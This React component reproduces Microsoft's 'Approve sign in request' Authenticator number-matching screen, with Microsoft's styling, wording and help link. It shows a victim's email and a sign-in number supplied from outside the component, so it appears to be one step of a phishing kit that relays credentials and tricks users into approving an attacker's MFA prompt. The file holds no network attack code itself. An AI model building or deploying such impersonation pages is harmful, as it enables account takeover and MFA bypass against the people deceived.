/* eslint-disable react/no-unescaped-entities */
/* eslint-disable react/prop-types */
/* eslint-disable no-unused-vars */
import React from "react";
import { Box, HStack, Icon, Image, Link, Text, VStack } from "@chakra-ui/react";
import Checkbox from "@mui/material/Checkbox";
import FormControlLabel from "@mui/material/FormControlLabel";

const Authenticator = ({
  authNumber,
  formData,
  setCurrentStep,
  setVerificationMessage,
}) => {
  if (formData && authNumber) {
    return (
      <>
        <VStack
          alignItems="flex-start"
          h="100%"
          justifyContent="space-between"
          w="100%"
        >
          <Text px="44px" position="relative" transform="translateY(-3px)">
            {formData.email}
          </Text>
          <Text
            px="44px"
            fontSize="1.5rem"
            fontFamily="Outfit"
            color="rgb(27, 27, 27)"
            lineHeight="28px"
            fontWeight="600"
          >
            Approve sign in request
          </Text>

          <VStack w="100%" px="44px">
            <HStack w="100%" alignItems="center">
              <Image src="/icons/picker.svg" alt="secure" w="24px" h="24px" />
              <Text position="relative" transform="translateY(6px)">
                Open your Authenticator app, and enter the number shown to sign
                in.
              </Text>
            </HStack>
            <HStack py="1.5rem" w="100%" justifyContent="center">
              <Text
                fontSize="3rem"
                fontFamily="Outfit"
                color="rgb(27, 27, 27)"
                lineHeight="28px"
                fontWeight="400"
              >
                {authNumber}
              </Text>
            </HStack>
            <Text>
              No numbers in your app? Make sure to upgrade to the latest
              version.
            </Text>
            <HStack w="100%" mt="0.5rem" position="relative">
              {/* <Checkbox colorPalette="blue" variant="solid">
                        Accept terms and conditions
                      </Checkbox> */}
              <FormControlLabel
                style={{
                  position: "relative",
                  transform: "translateX(6.5px)",
                  fontFamily: "Outfit",
                  color: "#383838",
                  gap: "0.5rem",
                }}
                control={
                  <Checkbox
                    sx={{
                      color: "rgba(0, 0, 0, 0.6)",
                      padding: "0",
                      "&.Mui-checked": {
                        color: "#00a4ef", // Color for the checked state
                        backgroundColor: "transparent", // Remove background color in checked state
                      },
                      "&:hover": {
                        backgroundColor: "transparent", // Remove background color on hover
                      },
                      "& .MuiCheckbox-root": {
                        padding: "0",
                      },
                    }}
                  />
                }
                label={
                  <Text fontFamily="Segoe UI">Don't ask again for 7 days</Text>
                }
              />
            </HStack>

            <HStack w="100%" alignItems="flex-start">
              <Text
                onClick={() => {
                  setVerificationMessage("");
                  setCurrentStep(2);
                }}
                color="#00a4ef"
                textAlign="left"
                fontSize="0.9rem"
                cursor="pointer"
              >
                I can't use my Microsoft Authenticator app right now
              </Text>
            </HStack>

            <HStack w="100%" alignItems="flex-start" pb="44px">
              <Link href="https://go.microsoft.com/fwlink/p/?LinkId=708614">
                <Text color="#00a4ef" textAlign="left" fontSize="0.9rem">
                  More information
                </Text>
              </Link>
            </HStack>
          </VStack>
          {/* <button onClick={() => alert("Submitted!")}>Submit</button>
                  <button onClick={() => setCurrentStep(currentStep - 1)}>
                    Back
                  </button> */}
        </VStack>
      </>
    );
  }
};

export default Authenticator;
